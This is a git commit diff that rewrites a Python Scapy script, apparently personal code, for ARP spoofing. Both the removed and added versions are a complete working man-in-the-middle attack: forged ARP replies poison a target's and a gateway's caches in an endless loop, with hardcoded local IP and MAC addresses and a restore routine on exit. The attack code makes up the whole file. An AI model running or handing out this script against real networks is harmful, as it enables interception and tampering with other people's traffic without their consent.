430d1a5dc7e3199522e3ed610098f0c0e6e1baca
brodotkim <brodotkim@gmail.com>
2021-06-17 10:47:29 +0900

    Add node - tcp

--- python/arp.py
+++ python/arp.py
@@ -1,77 +1,40 @@
-import scapy.all as scapy​
+import scapy.all as scapy
+import time
 
-import time​
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst = ip)
+    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    return answered_list[0][1].hwsrc
 
-  ​
+def spoof(target_ip, spoof_ip, target_mac):
+    #packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    scapy.send(packet, verbose = False)
 
-def get_mac(ip):​
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, verbose = False)
+      
+target_ip = "192.168.0.5" # Enter your target IP
+gateway_ip = "192.168.0.1" # Enter your gateway's IP
+target_mac = "C8:58:C0:21:34:7D"
+gateway_mac = "70:5D:CC:CD:7C:82"
 
-    arp_request = scapy.ARP(pdst = ip)​
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip, target_mac)
+        spoof(gateway_ip, target_ip, gateway_mac)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+        time.sleep(2) # Waits for two seconds
 
-    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")​
-
-    arp_request_broadcast = broadcast / arp_request​
-
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]​
-
-    return answered_list[0][1].hwsrc​
-
-  ​
-
-def spoof(target_ip, spoof_ip):​
-
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)​
-
-    scapy.send(packet, verbose = False)​
-
-  ​
-
-  ​
-
-def restore(destination_ip, source_ip):​
-
-    destination_mac = get_mac(destination_ip)​
-
-    source_mac = get_mac(source_ip)​
-
-    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)​
-
-    scapy.send(packet, verbose = False)​
-
-      ​
-
-  ​
-
-target_ip = "172.30.1.13" # Enter your target IP​
-
-gateway_ip = "172.30.1.254" # Enter your gateway's IP​
-
-  ​
-
-try:​
-
-    sent_packets_count = 0​
-
-    while True:​
-
-        spoof(target_ip, gateway_ip)​
-
-        spoof(gateway_ip, target_ip)​
-
-        sent_packets_count = sent_packets_count + 2​
-
-        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")​
-
-        time.sleep(2) # Waits for two seconds​
-
-  ​
-
-except KeyboardInterrupt:​
-
-    print("\nCtrl + C pressed.............Exiting")​
-
-    restore(gateway_ip, target_ip)​
-
-    restore(target_ip, gateway_ip)​
-
-    print("[+] Arp Spoof Stopped")​
+except KeyboardInterrupt:
+    print("\nCtrl + C pressed.............Exiting")
+    restore(gateway_ip, target_ip)
+    restore(target_ip, gateway_ip)
+    print("[+] Arp Spoof Stopped")
